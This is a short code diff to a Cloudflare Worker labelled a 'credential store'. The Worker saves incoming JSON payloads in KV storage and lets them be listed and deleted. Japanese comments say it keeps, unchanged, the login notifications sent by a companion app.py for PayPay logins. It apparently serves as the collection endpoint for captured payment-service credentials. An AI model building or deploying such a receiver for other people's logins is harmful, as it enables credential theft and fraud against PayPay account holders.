@@ -1,10 +1,13 @@
 // Cloudflare Worker — credential store
-// KV binding: CREDS  (create via dashboard or wrangler)
+// KV binding: CREDS
 // Deploy: wrangler deploy
 //
-// POST /        — store entry  (requires X-Secret header if SECRET env var is set)
+// POST /        — store entry (requires X-Secret header if SECRET env var is set)
 // GET  /?n=50   — list latest n entries (default 50)
 // DELETE /?key= — delete one entry by key
+//
+// app.py (main) の notify_worker() が送ってくるペイロードをそのまま保存する。
+// PayPay のログインエンドポイントは PayPaython_mobile ライブラリ依存のため、ここでは推測しない。
 
 export default {
   async fetch(request, env) {
@@ -22,8 +25,11 @@ export default {
     if (request.method === "POST") {
       let body;
       try { body = await request.json(); } catch { body = {}; }
+
+      // app.py からの login 通知をそのまま保存
       const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
       await env.CREDS.put(key, JSON.stringify(body));
+
       return json({ ok: true, key });
     }
 
